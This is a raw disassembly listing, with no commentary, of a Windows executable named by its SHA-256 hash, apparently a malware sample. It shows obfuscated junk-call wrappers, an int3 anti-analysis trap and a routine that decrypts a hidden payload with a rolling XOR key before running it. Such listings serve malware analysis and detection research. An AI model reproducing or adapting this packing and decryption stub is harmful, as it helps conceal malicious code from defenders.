
8220ab2bf2a37b69981ad7fadc794cb63ffda88219cd3ffd432045086d1afeca.exe:     file format pei-i386


Disassembly of section .text:

00401000 <.text>:
  401000:	mov    edi,edi
  401002:	push   ebp
  401003:	mov    ebp,esp
  401005:	sub    esp,0x60
  401008:	push   edx
  401009:	push   0x0
  40100b:	push   0x403014
  401010:	pop    eax
  401011:	call   DWORD PTR cs:[eax]
  401014:	pop    edx
  401015:	push   edx
  401016:	push   ecx
  401017:	push   DWORD PTR [edx+0x4f0]
  40101d:	push   eax
  40101e:	push   DWORD PTR [edx+0x114]
  401024:	call   0x401050
  401029:	add    esp,0x10
  40102c:	pop    edx
  40102d:	push   edx
  40102e:	push   0x403004
  401033:	pop    eax
  401034:	call   DWORD PTR cs:[eax]
  401037:	pop    edx
  401038:	sub    esp,0xffffffa0
  40103b:	mov    ebp,DWORD PTR [esp]
  40103e:	add    esp,0x4
  401041:	ret    
  401042:	add    BYTE PTR [eax],al
  401044:	add    BYTE PTR [eax],al
  401046:	add    BYTE PTR [eax],al
  401048:	jb     0x4010a0
  40104e:	add    BYTE PTR [eax],al
  401050:	mov    edi,edi
  401052:	push   ebp
  401053:	mov    ebp,esp
  401055:	sub    esp,0x30
  401058:	push   edx
  401059:	push   ecx
  40105a:	push   ebx
  40105b:	push   DWORD PTR [edx+0x570]
  401061:	push   DWORD PTR [edx+0x570]
  401067:	call   0x4016b8
  40106c:	add    esp,0x10
  40106f:	pop    edx
  401070:	push   edx
  401071:	mov    ecx,0x0
  401076:	push   ecx
  401077:	push   0x40301c
  40107c:	pop    eax
  40107d:	call   DWORD PTR cs:[eax]
  401080:	pop    edx
  401081:	push   edx
  401082:	mov    esi,0x0
  401087:	push   esi
  401088:	push   0x403074
  40108d:	pop    eax
  40108e:	call   DWORD PTR cs:[eax]
  401091:	pop    edx
  401092:	sub    esp,0xffffffd0
  401095:	mov    ebp,DWORD PTR [esp]
  401098:	add    esp,0x4
  40109b:	ret    
  40109c:	add    BYTE PTR [eax],al
  40109e:	add    BYTE PTR [eax],al
  4010a0:	mov    edi,edi
  4010a2:	pusha  
  4010a3:	push   ebp
  4010a4:	mov    ebp,esp
  4010a6:	sub    esp,0x44
  4010a9:	push   edx
  4010aa:	mov    edi,0x0
  4010af:	push   edi
  4010b0:	push   0x40301c
  4010b5:	pop    eax
  4010b6:	call   DWORD PTR cs:[eax]
  4010b9:	pop    edx
  4010ba:	test   eax,eax
  4010bc:	je     0x4010bf
  4010be:	ret    
  4010bf:	push   edx
  4010c0:	push   0x0
  4010c2:	push   0x403040
  4010c7:	pop    eax
  4010c8:	call   DWORD PTR cs:[eax]
  4010cb:	pop    edx
  4010cc:	push   edx
  4010cd:	push   DWORD PTR [edx+0x530]
  4010d3:	push   ecx
  4010d4:	call   0x401da4
  4010d9:	add    esp,0x8
  4010dc:	pop    edx
  4010dd:	mov    edi,0x403010
  4010e2:	mov    edi,DWORD PTR [edi]
  4010e4:	push   edi
  4010e5:	push   DWORD PTR [edx+0x4c4]
  4010eb:	pop    ebx
  4010ec:	call   ebx
  4010ee:	sub    esp,0xffffffbc
  4010f1:	mov    ebp,DWORD PTR [esp]
  4010f4:	add    esp,0x4
  4010f7:	ret    
  4010f8:	add    BYTE PTR [eax],al
  4010fa:	add    BYTE PTR [eax],al
  4010fc:	mov    edi,edi
  4010fe:	push   ebp
  4010ff:	mov    ebp,esp
  401101:	sub    esp,0x3c
  401104:	push   edx
  401105:	mov    edi,0x0
  40110a:	push   edi
  40110b:	push   0x403040
  401110:	pop    eax
  401111:	call   DWORD PTR cs:[eax]
  401114:	pop    edx
  401115:	push   edx
  401116:	push   esi
  401117:	push   eax
  401118:	push   DWORD PTR [edx+0x36c]
  40111e:	push   DWORD PTR [edx+0x47c]
  401124:	call   0x401c40
  401129:	add    esp,0x10
  40112c:	pop    edx
  40112d:	push   edx
  40112e:	lea    ebx,[edx]
  401130:	push   ebx
  401131:	push   0x403010
  401136:	pop    eax
  401137:	call   DWORD PTR cs:[eax]
  40113a:	test   eax,eax
  40113c:	jne    0x40112e
  40113e:	pop    edx
  40113f:	sub    esp,0xffffffc4
  401142:	mov    ebp,DWORD PTR [esp]
  401145:	add    esp,0x4
  401148:	ret    
	...
  401151:	add    BYTE PTR [eax],al
  401153:	add    BYTE PTR [ebx-0x1374aa01],cl
  401159:	sub    esp,0x58
  40115c:	push   edx
  40115d:	push   edi
  40115e:	push   DWORD PTR [edx+0x29c]
  401164:	push   edi
  401165:	push   DWORD PTR [edx+0x524]
  40116b:	call   0x401544
  401170:	add    esp,0x10
  401173:	pop    edx
  401174:	push   edx
  401175:	push   0x0
  401177:	push   0x403040
  40117c:	pop    eax
  40117d:	call   DWORD PTR cs:[eax]
  401180:	pop    edx
  401181:	push   edx
  401182:	push   0x0
  401184:	push   0x40303c
  401189:	pop    eax
  40118a:	call   DWORD PTR cs:[eax]
  40118d:	pop    edx
  40118e:	sub    esp,0xffffffa8
  401191:	mov    ebp,DWORD PTR [esp]
  401194:	add    esp,0x4
  401197:	ret    
  401198:	mov    edi,edi
  40119a:	push   ebp
  40119b:	mov    ebp,esp
  40119d:	sub    esp,0x3c
  4011a0:	push   edx
  4011a1:	push   0x0
  4011a3:	push   0x40305c
  4011a8:	pop    eax
  4011a9:	call   DWORD PTR cs:[eax]
  4011ac:	pop    edx
  4011ad:	push   edx
  4011ae:	push   esi
  4011af:	push   DWORD PTR [edx+0xbc]
  4011b5:	push   ebx
  4011b6:	call   0x401bf0
  4011bb:	add    esp,0xc
  4011be:	pop    edx
  4011bf:	push   edx
  4011c0:	mov    edx,0x0
  4011c5:	push   edx
  4011c6:	push   0x40303c
  4011cb:	pop    eax
  4011cc:	call   DWORD PTR cs:[eax]
  4011cf:	pop    edx
  4011d0:	sub    esp,0xffffffc4
  4011d3:	mov    ebp,DWORD PTR [esp]
  4011d6:	add    esp,0x4
  4011d9:	ret    
  4011da:	add    BYTE PTR [eax],al
  4011dc:	mov    edi,edi
  4011de:	push   ebp
  4011df:	mov    ebp,esp
  4011e1:	sub    esp,0x4c
  4011e4:	push   edx
  4011e5:	push   DWORD PTR [edx+0x94]
  4011eb:	push   DWORD PTR [edx+0x1f8]
  4011f1:	push   eax
  4011f2:	push   DWORD PTR [edx+0x284]
  4011f8:	call   0x4018bc
  4011fd:	add    esp,0x10
  401200:	pop    edx
  401201:	push   edx
  401202:	mov    eax,0x0
  401207:	push   eax
  401208:	push   0x403020
  40120d:	pop    eax
  40120e:	call   DWORD PTR cs:[eax]
  401211:	pop    edx
  401212:	push   edx
  401213:	push   0x0
  401215:	push   0x40303c
  40121a:	pop    eax
  40121b:	call   DWORD PTR cs:[eax]
  40121e:	pop    edx
  40121f:	sub    esp,0xffffffb4
  401222:	mov    ebp,DWORD PTR [esp]
  401225:	add    esp,0x4
  401228:	ret    
  401229:	add    BYTE PTR [eax],al
  40122b:	add    BYTE PTR [ebx-0x1374aa01],cl
  401231:	sub    esp,0x60
  401234:	push   edx
  401235:	push   DWORD PTR [edx+0x2d4]
  40123b:	push   DWORD PTR [edx+0x5e8]
  401241:	push   DWORD PTR [edx+0x1c]
  401244:	call   0x401304
  401249:	add    esp,0xc
  40124c:	pop    edx
  40124d:	push   edx
  40124e:	push   0x0
  401250:	push   0x40303c
  401255:	pop    eax
  401256:	call   DWORD PTR cs:[eax]
  401259:	pop    edx
  40125a:	push   edx
  40125b:	push   0x0
  40125d:	push   0x403074
  401262:	pop    eax
  401263:	call   DWORD PTR cs:[eax]
  401266:	pop    edx
  401267:	sub    esp,0xffffffa0
  40126a:	mov    ebp,DWORD PTR [esp]
  40126d:	add    esp,0x4
  401270:	ret    
  401271:	add    BYTE PTR [eax],al
  401273:	add    BYTE PTR [ebx-0x1374aa01],cl
  401279:	sub    esp,0x50
  40127c:	push   edx
  40127d:	mov    eax,0x0
  401282:	push   eax
  401283:	push   0x40302c
  401288:	pop    eax
  401289:	call   DWORD PTR cs:[eax]
  40128c:	pop    edx
  40128d:	push   edx
  40128e:	push   eax
  40128f:	push   ebx
  401290:	push   eax
  401291:	push   DWORD PTR [edx+0x3fc]
  401297:	call   0x401a70
  40129c:	add    esp,0x10
  40129f:	pop    edx
  4012a0:	push   edx
  4012a1:	push   0x0
  4012a3:	push   0x40303c
  4012a8:	pop    eax
  4012a9:	call   DWORD PTR cs:[eax]
  4012ac:	pop    edx
  4012ad:	sub    esp,0xffffffb0
  4012b0:	mov    ebp,DWORD PTR [esp]
  4012b3:	add    esp,0x4
  4012b6:	ret    
	...
  4012c3:	add    BYTE PTR [ebx-0x1374aa01],cl
  4012c9:	sub    esp,0x5c
  4012cc:	push   edx
  4012cd:	mov    edi,0x0
  4012d2:	push   edi
  4012d3:	push   0x40304c
  4012d8:	pop    eax
  4012d9:	call   DWORD PTR cs:[eax]
  4012dc:	pop    edx
  4012dd:	push   edx
  4012de:	push   eax
  4012df:	push   DWORD PTR [edx+0xe0]
  4012e5:	call   0x4010fc
  4012ea:	add    esp,0x8
  4012ed:	pop    edx
  4012ee:	push   edx
  4012ef:	push   0x403034
  4012f4:	pop    eax
  4012f5:	call   DWORD PTR cs:[eax]
  4012f8:	pop    edx
  4012f9:	sub    esp,0xffffffa4
  4012fc:	mov    ebp,DWORD PTR [esp]
  4012ff:	add    esp,0x4
  401302:	ret    
  401303:	add    BYTE PTR [ebx-0x1374aa01],cl
  401309:	sub    esp,0x5c
  40130c:	push   edx
  40130d:	push   0x0
  40130f:	push   0x40304c
  401314:	pop    eax
  401315:	call   DWORD PTR cs:[eax]
  401318:	pop    edx
  401319:	push   edx
  40131a:	push   esi
  40131b:	push   DWORD PTR [edx+0x48]
  40131e:	call   0x40135c
  401323:	add    esp,0x8
  401326:	pop    edx
  401327:	push   edx
  401328:	push   0x0
  40132a:	push   0x40305c
  40132f:	pop    eax
  401330:	call   DWORD PTR cs:[eax]
  401333:	pop    edx
  401334:	sub    esp,0xffffffa4
  401337:	mov    ebp,DWORD PTR [esp]
  40133a:	add    esp,0x4
  40133d:	ret    
	...
  40135a:	add    BYTE PTR [eax],al
  40135c:	mov    edi,edi
  40135e:	push   ebp
  40135f:	mov    ebp,esp
  401361:	sub    esp,0x48
  401364:	push   edx
  401365:	push   edi
  401366:	push   DWORD PTR [edx+0x500]
  40136c:	call   0x4014f8
  401371:	add    esp,0x8
  401374:	pop    edx
  401375:	push   edx
  401376:	push   0x403034
  40137b:	pop    eax
  40137c:	call   DWORD PTR cs:[eax]
  40137f:	pop    edx
  401380:	push   edx
  401381:	push   0x0
  401383:	push   0x403084
  401388:	pop    eax
  401389:	call   DWORD PTR cs:[eax]
  40138c:	pop    edx
  40138d:	sub    esp,0xffffffb8
  401390:	mov    ebp,DWORD PTR [esp]
  401393:	add    esp,0x4
  401396:	ret    
  401397:	add    BYTE PTR [eax],al
  401399:	add    BYTE PTR [eax],al
  40139b:	add    BYTE PTR [ebx-0x1374aa01],cl
  4013a1:	sub    esp,0x20
  4013a4:	push   edx
  4013a5:	mov    ebx,0x0
  4013aa:	push   ebx
  4013ab:	push   0x403008
  4013b0:	pop    eax
  4013b1:	call   DWORD PTR cs:[eax]
  4013b4:	pop    edx
  4013b5:	push   edx
  4013b6:	push   eax
  4013b7:	push   DWORD PTR [edx+0x404]
  4013bd:	call   0x401744
  4013c2:	add    esp,0x8
  4013c5:	pop    edx
  4013c6:	push   edx
  4013c7:	push   0x0
  4013c9:	push   0x40303c
  4013ce:	pop    eax
  4013cf:	call   DWORD PTR cs:[eax]
  4013d2:	pop    edx
  4013d3:	sub    esp,0xffffffe0
  4013d6:	mov    ebp,DWORD PTR [esp]
  4013d9:	add    esp,0x4
  4013dc:	ret    
  4013dd:	add    BYTE PTR [eax],al
  4013df:	add    BYTE PTR [ebx],ch
  4013e1:	rol    BYTE PTR [ecx+0x47f000c2],cl
  4013e7:	add    BYTE PTR [edx+0x33],dl
  4013ea:	leave  
  4013eb:	or     ecx,0x40309c
  4013f1:	and    WORD PTR [ecx],0x0
  4013f5:	push   DWORD PTR [ecx]
  4013f7:	pop    eax
  4013f8:	mov    edx,eax
  4013fa:	push   0x3c
  4013fc:	add    DWORD PTR [esp],eax
  4013ff:	pop    ecx
  401400:	push   eax
  401401:	mov    edi,esp
  401403:	mov    esi,ecx
  401405:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401406:	pop    eax
  401407:	mov    edx,DWORD PTR [eax+edx*1+0x1c]
  40140b:	ror    edx,0x8
  40140e:	xor    eax,eax
  401410:	or     al,0x80
  401412:	cmp    al,dl
  401414:	pop    edx
  401415:	ja     0x401420
  401417:	nop
  401418:	nop
  401419:	nop
  40141a:	nop
  40141b:	jmp    0x401048
  401420:	xor    esp,esp
  401422:	int    0x3
  401424:	add    BYTE PTR [eax],al
  401426:	add    BYTE PTR [eax],al
  401428:	mov    edi,edi
  40142a:	push   ebp
  40142b:	mov    ebp,esp
  40142d:	sub    esp,0x58
  401430:	push   edx
  401431:	push   DWORD PTR [edx+0x390]
  401437:	push   DWORD PTR [edx+0x2e4]
  40143d:	call   0x4017e4
  401442:	add    esp,0x8
  401445:	pop    edx
  401446:	push   edx
  401447:	push   0x0
  401449:	push   0x403020
  40144e:	pop    eax
  40144f:	call   DWORD PTR cs:[eax]
  401452:	pop    edx
  401453:	push   edx
  401454:	push   0x0
  401456:	push   0x40304c
  40145b:	pop    eax
  40145c:	call   DWORD PTR cs:[eax]
  40145f:	pop    edx
  401460:	sub    esp,0xffffffa8
  401463:	mov    ebp,DWORD PTR [esp]
  401466:	add    esp,0x4
  401469:	ret    
  40146a:	add    BYTE PTR [eax],al
  40146c:	mov    edi,edi
  40146e:	push   ebp
  40146f:	mov    ebp,esp
  401471:	sub    esp,0x58
  401474:	push   edx
  401475:	push   0x0
  401477:	push   0x40303c
  40147c:	pop    eax
  40147d:	call   DWORD PTR cs:[eax]
  401480:	pop    edx
  401481:	push   edx
  401482:	push   DWORD PTR [edx+0x398]
  401488:	push   ebx
  401489:	push   eax
  40148a:	call   0x40194c
  40148f:	add    esp,0xc
  401492:	pop    edx
  401493:	push   edx
  401494:	push   0x0
  401496:	push   0x403008
  40149b:	pop    eax
  40149c:	call   DWORD PTR cs:[eax]
  40149f:	pop    edx
  4014a0:	sub    esp,0xffffffa8
  4014a3:	mov    ebp,DWORD PTR [esp]
  4014a6:	add    esp,0x4
  4014a9:	ret    
  4014aa:	add    BYTE PTR [eax],al
  4014ac:	add    BYTE PTR [eax],al
  4014ae:	add    BYTE PTR [eax],al
  4014b0:	mov    edi,edi
  4014b2:	push   ebp
  4014b3:	mov    ebp,esp
  4014b5:	sub    esp,0x38
  4014b8:	push   edx
  4014b9:	push   ebx
  4014ba:	push   ebx
  4014bb:	push   ebx
  4014bc:	call   0x401a30
  4014c1:	add    esp,0xc
  4014c4:	pop    edx
  4014c5:	push   edx
  4014c6:	push   0x0
  4014c8:	push   0x40302c
  4014cd:	pop    eax
  4014ce:	call   DWORD PTR cs:[eax]
  4014d1:	pop    edx
  4014d2:	push   edx
  4014d3:	push   0x0
  4014d5:	push   0x40301c
  4014da:	pop    eax
  4014db:	call   DWORD PTR cs:[eax]
  4014de:	pop    edx
  4014df:	sub    esp,0xffffffc8
  4014e2:	mov    ebp,DWORD PTR [esp]
  4014e5:	add    esp,0x4
  4014e8:	ret    
	...
  4014f5:	add    BYTE PTR [eax],al
  4014f7:	add    BYTE PTR [ebx-0x1374aa01],cl
  4014fd:	sub    esp,0x24
  401500:	push   edx
  401501:	lea    eax,[edx]
  401503:	push   eax
  401504:	push   0x403010
  401509:	pop    eax
  40150a:	call   DWORD PTR cs:[eax]
  40150d:	test   eax,eax
  40150f:	jne    0x401501
  401511:	pop    edx
  401512:	push   edx
  401513:	push   edi
  401514:	push   DWORD PTR [edx+0x360]
  40151a:	call   0x401198
  40151f:	add    esp,0x8
  401522:	pop    edx
  401523:	push   edx
  401524:	push   0x0
  401526:	push   0x40305c
  40152b:	pop    eax
  40152c:	call   DWORD PTR cs:[eax]
  40152f:	pop    edx
  401530:	sub    esp,0xffffffdc
  401533:	mov    ebp,DWORD PTR [esp]
  401536:	add    esp,0x4
  401539:	ret    
	...
  401542:	add    BYTE PTR [eax],al
  401544:	mov    edi,edi
  401546:	push   ebp
  401547:	mov    ebp,esp
  401549:	sub    esp,0x4c
  40154c:	push   edx
  40154d:	push   DWORD PTR [edx+0x510]
  401553:	push   eax
  401554:	push   DWORD PTR [edx+0x214]
  40155a:	push   DWORD PTR [edx+0x184]
  401560:	call   0x401274
  401565:	add    esp,0x10
  401568:	pop    edx
  401569:	push   edx
  40156a:	mov    ecx,0x0
  40156f:	push   ecx
  401570:	push   0x40304c
  401575:	pop    eax
  401576:	call   DWORD PTR cs:[eax]
  401579:	pop    edx
  40157a:	push   edx
  40157b:	mov    ebx,0x0
  401580:	push   ebx
  401581:	push   0x403040
  401586:	pop    eax
  401587:	call   DWORD PTR cs:[eax]
  40158a:	pop    edx
  40158b:	sub    esp,0xffffffb4
  40158e:	mov    ebp,DWORD PTR [esp]
  401591:	add    esp,0x4
  401594:	ret    
  401595:	add    BYTE PTR [eax],al
  401597:	add    BYTE PTR [ebx-0x1374aa01],cl
  40159d:	sub    esp,0x2c
  4015a0:	push   edx
  4015a1:	push   DWORD PTR [edx+0x444]
  4015a7:	push   DWORD PTR [edx+0x4ec]
  4015ad:	push   ecx
  4015ae:	call   0x401de4
  4015b3:	add    esp,0xc
  4015b6:	pop    edx
  4015b7:	push   edx
  4015b8:	push   0x0
  4015ba:	push   0x403040
  4015bf:	pop    eax
  4015c0:	call   DWORD PTR cs:[eax]
  4015c3:	pop    edx
  4015c4:	push   edx
  4015c5:	push   0x0
  4015c7:	push   0x40303c
  4015cc:	pop    eax
  4015cd:	call   DWORD PTR cs:[eax]
  4015d0:	pop    edx
  4015d1:	sub    esp,0xffffffd4
  4015d4:	mov    ebp,DWORD PTR [esp]
  4015d7:	add    esp,0x4
  4015da:	ret    
  4015db:	add    BYTE PTR [eax],al
  4015dd:	add    BYTE PTR [eax],al
  4015df:	add    BYTE PTR [ebx-0x1374aa01],cl
  4015e5:	sub    esp,0x20
  4015e8:	push   edx
  4015e9:	push   ecx
  4015ea:	push   DWORD PTR [edx+0x34]
  4015ed:	push   ecx
  4015ee:	push   DWORD PTR [edx+0x31c]
  4015f4:	call   0x401428
  4015f9:	add    esp,0x10
  4015fc:	pop    edx
  4015fd:	push   edx
  4015fe:	push   0x0
  401600:	push   0x403040
  401605:	pop    eax
  401606:	call   DWORD PTR cs:[eax]
  401609:	pop    edx
  40160a:	push   edx
  40160b:	push   0x0
  40160d:	push   0x403084
  401612:	pop    eax
  401613:	call   DWORD PTR cs:[eax]
  401616:	pop    edx
  401617:	sub    esp,0xffffffe0
  40161a:	mov    ebp,DWORD PTR [esp]
  40161d:	add    esp,0x4
  401620:	ret    
  401621:	add    BYTE PTR [eax],al
  401623:	add    BYTE PTR [eax],al
  401625:	add    BYTE PTR [eax],al
  401627:	add    BYTE PTR [ebx-0x1374aa01],cl
  40162d:	sub    esp,0x2c
  401630:	push   edx
  401631:	push   0x0
  401633:	push   0x40301c
  401638:	pop    eax
  401639:	call   DWORD PTR cs:[eax]
  40163c:	pop    edx
  40163d:	push   edx
  40163e:	push   esi
  40163f:	push   eax
  401640:	push   edi
  401641:	push   DWORD PTR [edx+0x264]
  401647:	call   0x401d14
  40164c:	add    esp,0x10
  40164f:	pop    edx
  401650:	push   edx
  401651:	push   0x0
  401653:	push   0x40304c
  401658:	pop    eax
  401659:	call   DWORD PTR cs:[eax]
  40165c:	pop    edx
  40165d:	sub    esp,0xffffffd4
  401660:	mov    ebp,DWORD PTR [esp]
  401663:	add    esp,0x4
  401666:	ret    
	...
  40166f:	add    BYTE PTR [ebx-0x1374aa01],cl
  401675:	sub    esp,0x3c
  401678:	push   edx
  401679:	push   ecx
  40167a:	push   DWORD PTR [edx+0x10]
  40167d:	push   edi
  40167e:	push   DWORD PTR [edx+0x3e4]
  401684:	call   0x401e28
  401689:	add    esp,0x10
  40168c:	pop    edx
  40168d:	push   edx
  40168e:	mov    edi,0x0
  401693:	push   edi
  401694:	push   0x40305c
  401699:	pop    eax
  40169a:	call   DWORD PTR cs:[eax]
  40169d:	pop    edx
  40169e:	push   edx
  40169f:	push   0x0
  4016a1:	push   0x40304c
  4016a6:	pop    eax
  4016a7:	call   DWORD PTR cs:[eax]
  4016aa:	pop    edx
  4016ab:	sub    esp,0xffffffc4
  4016ae:	mov    ebp,DWORD PTR [esp]
  4016b1:	add    esp,0x4
  4016b4:	ret    
  4016b5:	add    BYTE PTR [eax],al
  4016b7:	add    BYTE PTR [ebx-0x1374aa01],cl
  4016bd:	sub    esp,0x60
  4016c0:	push   edx
  4016c1:	push   DWORD PTR [edx+0xb8]
  4016c7:	push   DWORD PTR [edx+0x264]
  4016cd:	call   0x40139c
  4016d2:	add    esp,0x8
  4016d5:	pop    edx
  4016d6:	push   edx
  4016d7:	mov    edx,0x0
  4016dc:	push   edx
  4016dd:	push   0x40302c
  4016e2:	pop    eax
  4016e3:	call   DWORD PTR cs:[eax]
  4016e6:	pop    edx
  4016e7:	push   edx
  4016e8:	mov    ebx,0x0
  4016ed:	push   ebx
  4016ee:	push   0x403020
  4016f3:	pop    eax
  4016f4:	call   DWORD PTR cs:[eax]
  4016f7:	pop    edx
  4016f8:	sub    esp,0xffffffa0
  4016fb:	mov    ebp,DWORD PTR [esp]
  4016fe:	add    esp,0x4
  401701:	ret    
  401702:	add    BYTE PTR [eax],al
  401704:	add    BYTE PTR [eax],al
  401706:	add    BYTE PTR [eax],al
  401708:	mov    edi,edi
  40170a:	push   ebp
  40170b:	mov    ebp,esp
  40170d:	sub    esp,0x34
  401710:	push   edx
  401711:	push   0x403034
  401716:	pop    eax
  401717:	call   DWORD PTR cs:[eax]
  40171a:	pop    edx
  40171b:	push   edx
  40171c:	push   eax
  40171d:	push   edi
  40171e:	call   0x4011dc
  401723:	add    esp,0x8
  401726:	pop    edx
  401727:	push   edx
  401728:	mov    edx,0x0
  40172d:	push   edx
  40172e:	push   0x403020
  401733:	pop    eax
  401734:	call   DWORD PTR cs:[eax]
  401737:	pop    edx
  401738:	sub    esp,0xffffffcc
  40173b:	mov    ebp,DWORD PTR [esp]
  40173e:	add    esp,0x4
  401741:	ret    
  401742:	add    BYTE PTR [eax],al
  401744:	mov    edi,edi
  401746:	push   ebp
  401747:	mov    ebp,esp
  401749:	sub    esp,0x3c
  40174c:	push   edx
  40174d:	push   0x6b0
  401752:	push   0x6b0
  401757:	mov    esi,0x40000
  40175c:	push   esi
  40175d:	push   0x403028
  401762:	pop    ecx
  401763:	push   DWORD PTR [ecx]
  401765:	sub    DWORD PTR [esp],0x2
  401769:	push   0x403038
  40176e:	pop    ecx
  40176f:	pop    DWORD PTR [ecx]
  401771:	push   0x403038
  401776:	pop    eax
  401777:	call   DWORD PTR cs:[eax]
  40177a:	xchg   DWORD PTR [esp],eax
  40177d:	mov    edx,eax
  40177f:	pop    edi
  401780:	mov    DWORD PTR [edx+0x4c4],edi
  401786:	mov    esi,DWORD PTR [edx+0x4c4]
  40178c:	lea    eax,[esi]
  40178e:	sub    esi,esi
  401790:	dec    esi
  401791:	and    esi,0x401ec9
  401797:	mov    edi,DWORD PTR [esi]
  401799:	mov    DWORD PTR [eax],edi
  40179b:	add    esi,0x3
  40179e:	add    eax,0x3
  4017a1:	mov    edi,0x6a719112
  4017a6:	xor    ebx,ebx
  4017a8:	add    ebx,0x6b0
  4017ae:	test   ebx,ebx
  4017b0:	je     0x4017ce
  4017b2:	add    ebx,0xfffffffc
  4017b5:	mov    ecx,edi
  4017b7:	xor    ecx,DWORD PTR [esi]
  4017b9:	sub    ecx,0x1
  4017bc:	mov    DWORD PTR [eax],ecx
  4017be:	push   DWORD PTR [eax]
  4017c0:	mov    edi,0xfffffffc
  4017c5:	sub    esi,edi
  4017c7:	sub    eax,edi
  4017c9:	pop    edi
  4017ca:	bswap  edi
  4017cc:	jmp    0x4017ae
  4017ce:	push   edx
  4017cf:	mov    eax,0x0
  4017d4:	push   eax
  4017d5:	push   0x403020
  4017da:	pop    eax
  4017db:	call   DWORD PTR cs:[eax]
  4017de:	pop    edx
  4017df:	sub    esp,0xffffffc4
  4017e2:	pop    ebp
  4017e3:	ret    
  4017e4:	mov    edi,edi
  4017e6:	push   ebp
  4017e7:	mov    ebp,esp
  4017e9:	sub    esp,0x60
  4017ec:	push   edx
  4017ed:	push   DWORD PTR [edx+0x474]
  4017f3:	push   ebx
  4017f4:	push   DWORD PTR [edx+0x3a8]
  4017fa:	push   edi
  4017fb:	call   0x401708
  401800:	add    esp,0x10
  401803:	pop    edx
  401804:	push   edx
  401805:	push   0x0
  401807:	push   0x40304c
  40180c:	pop    eax
  40180d:	call   DWORD PTR cs:[eax]
  401810:	pop    edx
  401811:	push   edx
  401812:	mov    eax,0x0
  401817:	push   eax
  401818:	push   0x40301c
  40181d:	pop    eax
  40181e:	call   DWORD PTR cs:[eax]
  401821:	pop    edx
  401822:	sub    esp,0xffffffa0
  401825:	mov    ebp,DWORD PTR [esp]
  401828:	add    esp,0x4
  40182b:	ret    
  40182c:	mov    edi,edi
  40182e:	push   ebp
  40182f:	mov    ebp,esp
  401831:	sub    esp,0x54
  401834:	push   edx
  401835:	push   0x0
  401837:	push   0x40304c
  40183c:	pop    eax
  40183d:	call   DWORD PTR cs:[eax]
  401840:	pop    edx
  401841:	push   edx
  401842:	push   DWORD PTR [edx+0x288]
  401848:	push   DWORD PTR [edx+0x514]
  40184e:	push   eax
  40184f:	call   0x401628
  401854:	add    esp,0xc
  401857:	pop    edx
  401858:	push   edx
  401859:	mov    edx,0x0
  40185e:	push   edx
  40185f:	push   0x40303c
  401864:	pop    eax
  401865:	call   DWORD PTR cs:[eax]
  401868:	pop    edx
  401869:	sub    esp,0xffffffac
  40186c:	mov    ebp,DWORD PTR [esp]
  40186f:	add    esp,0x4
  401872:	ret    
  401873:	add    BYTE PTR [eax],al
  401875:	add    BYTE PTR [eax],al
  401877:	add    BYTE PTR [ebx-0x1374aa01],cl
  40187d:	sub    esp,0x20
  401880:	push   edx
  401881:	push   DWORD PTR [edx+0xdc]
  401887:	push   eax
  401888:	push   DWORD PTR [edx+0x2c0]
  40188e:	push   esi
  40188f:	call   0x40182c
  401894:	add    esp,0x10
  401897:	pop    edx
  401898:	push   edx
  401899:	push   0x0
  40189b:	push   0x40300c
  4018a0:	pop    eax
  4018a1:	call   DWORD PTR cs:[eax]
  4018a4:	pop    edx
  4018a5:	push   edx
  4018a6:	push   0x0
  4018a8:	push   0x403040
  4018ad:	pop    eax
  4018ae:	call   DWORD PTR cs:[eax]
  4018b1:	pop    edx
  4018b2:	sub    esp,0xffffffe0
  4018b5:	mov    ebp,DWORD PTR [esp]
  4018b8:	add    esp,0x4
  4018bb:	ret    
  4018bc:	mov    edi,edi
  4018be:	push   ebp
  4018bf:	mov    ebp,esp
  4018c1:	sub    esp,0x58
  4018c4:	push   edx
  4018c5:	push   0x403034
  4018ca:	pop    eax
  4018cb:	call   DWORD PTR cs:[eax]
  4018ce:	pop    edx
  4018cf:	push   edx
  4018d0:	push   DWORD PTR [edx+0x5a8]
  4018d6:	push   eax
  4018d7:	push   DWORD PTR [edx+0xd4]
  4018dd:	push   eax
  4018de:	call   0x401d5c
  4018e3:	add    esp,0x10
  4018e6:	pop    edx
  4018e7:	push   edx
  4018e8:	lea    eax,[edx]
  4018ea:	push   eax
  4018eb:	push   0x403010
  4018f0:	pop    eax
  4018f1:	call   DWORD PTR cs:[eax]
  4018f4:	test   eax,eax
  4018f6:	jne    0x4018e8
  4018f8:	pop    edx
  4018f9:	sub    esp,0xffffffa8
  4018fc:	mov    ebp,DWORD PTR [esp]
  4018ff:	add    esp,0x4
  401902:	ret    
  401903:	add    BYTE PTR [eax],al
  401905:	add    BYTE PTR [eax],al
  401907:	add    BYTE PTR [ebx-0x1374aa01],cl
  40190d:	sub    esp,0x54
  401910:	push   edx
  401911:	push   0x0
  401913:	push   0x403008
  401918:	pop    eax
  401919:	call   DWORD PTR cs:[eax]
  40191c:	pop    edx
  40191d:	push   edx
  40191e:	push   ebx
  40191f:	push   DWORD PTR [edx+0x3d4]
  401925:	call   0x401ba0
  40192a:	add    esp,0x8
  40192d:	pop    edx
  40192e:	push   edx
  40192f:	mov    ecx,0x0
  401934:	push   ecx
  401935:	push   0x403084
  40193a:	pop    eax
  40193b:	call   DWORD PTR cs:[eax]
  40193e:	pop    edx
  40193f:	sub    esp,0xffffffac
  401942:	mov    ebp,DWORD PTR [esp]
  401945:	add    esp,0x4
  401948:	ret    
  401949:	add    BYTE PTR [eax],al
  40194b:	add    BYTE PTR [ebx-0x1374aa01],cl
  401951:	sub    esp,0x38
  401954:	push   edx
  401955:	mov    edi,0x0
  40195a:	push   edi
  40195b:	push   0x40300c
  401960:	pop    eax
  401961:	call   DWORD PTR cs:[eax]
  401964:	pop    edx
  401965:	push   edx
  401966:	push   DWORD PTR [edx+0x4c4]
  40196c:	push   DWORD PTR [edx+0x104]
  401972:	call   0x40122c
  401977:	add    esp,0x8
  40197a:	pop    edx
  40197b:	push   edx
  40197c:	mov    edi,0x0
  401981:	push   edi
  401982:	push   0x40302c
  401987:	pop    eax
  401988:	call   DWORD PTR cs:[eax]
  40198b:	pop    edx
  40198c:	sub    esp,0xffffffc8
  40198f:	mov    ebp,DWORD PTR [esp]
  401992:	add    esp,0x4
  401995:	ret    
  401996:	add    BYTE PTR [eax],al
  401998:	mov    edi,edi
  40199a:	push   ebp
  40199b:	mov    ebp,esp
  40199d:	sub    esp,0x34
  4019a0:	push   edx
  4019a1:	push   DWORD PTR [edx+0x508]
